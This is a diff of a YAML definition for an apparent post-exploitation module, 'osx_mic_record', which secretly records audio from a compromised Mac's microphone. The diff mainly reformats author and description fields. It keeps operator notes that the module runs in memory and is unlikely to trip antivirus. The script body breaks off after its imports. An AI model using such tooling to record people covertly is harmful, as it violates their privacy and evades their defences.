@@ -1,8 +1,9 @@
 name: osx_mic_record
 authors:
-  - '@s0lst1c3'
-description: Records audio through the MacOS webcam mic by leveraging the Apple AVFoundation
-  API.
+  - name: ''
+    handle: '@s0lst1c3'
+    link: ''
+description: Records audio through the MacOS webcam mic by leveraging the Apple AVFoundation API.
 software: ''
 techniques:
   - T1512
@@ -13,24 +14,22 @@ opsec_safe: false
 language: python
 min_language_version: '2.6'
 comments:
-  - Executed within memory, although recorded audio will touch disk while the script
-    is running. This is unlikely to trip A/V, although a user may notice the audio file
-    if it stored in an obvious location.
+  - Executed within memory, although recorded audio will touch disk while the script is running. This is unlikely to trip
+    A/V, although a user may notice the audio file if it stored in an obvious location.
 options:
   - name: Agent
     description: Agent to record audio from.
     required: true
     value: ''
   - name: OutputDir
-    description: 'Directory on remote machine in recorded audio should be saved. (Default:
-    /tmp)'
+    description: 'Directory on remote machine in recorded audio should be saved. (Default: /tmp)'
     required: false
     value: /tmp
   - name: RecordTime
     description: 'The length of the audio recording in seconds. (Default: 5)'
     required: false
     value: '5'
-script: |
+script: |-
   import objc
   import objc._objc
   import time
